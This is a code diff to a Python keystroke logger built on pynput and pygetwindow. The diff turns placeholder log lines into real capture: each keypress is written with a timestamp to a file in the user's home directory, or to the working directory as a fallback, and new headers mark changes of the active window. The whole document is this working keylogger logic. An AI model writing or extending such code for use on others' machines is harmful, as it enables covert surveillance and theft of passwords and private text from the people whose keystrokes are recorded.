@@ -2,13 +2,15 @@ import pynput.keyboard
 import pygetwindow as gw
 import datetime
 import os
+
 last_window = ""
 
 def write_to_log(key):
     global last_window
     target_path = os.path.expanduser("~/my_log.txt")
     directory = os.path.dirname(target_path)
-    # Termination logic, make sure to return False to stop the listener
+    
+    # Termination logic
     if key == pynput.keyboard.Key.esc:
         return False
 
@@ -24,14 +26,22 @@ def write_to_log(key):
     except AttributeError:
         k = str(key)
 
+    # Primary path is user home directory
     if os.path.exists(directory):
         with open(target_path, "a") as f:
-            f.write("Data entry\n")
+            if active_window != last_window:
+                f.write(f"\n--- [Window: {active_window}] ---\n")
+                last_window = active_window
+            f.write(f"[{now}] {k}\n")
+    
+    # Fallback path is current working directory
     else:
-    # Fallback to the current working directory if home is unavailable
         with open("my_log.txt", "a") as f:
-            f.write("Data entry (Fallback path)\n")
+            if active_window != last_window:
+                f.write(f"\n--- [Window: {active_window}] ---\n")
+                last_window = active_window
+            f.write(f"[{now}] {k}\n")
 
-# Execution block
+# the execution block
 with pynput.keyboard.Listener(on_press=write_to_log) as listener:
     listener.join()
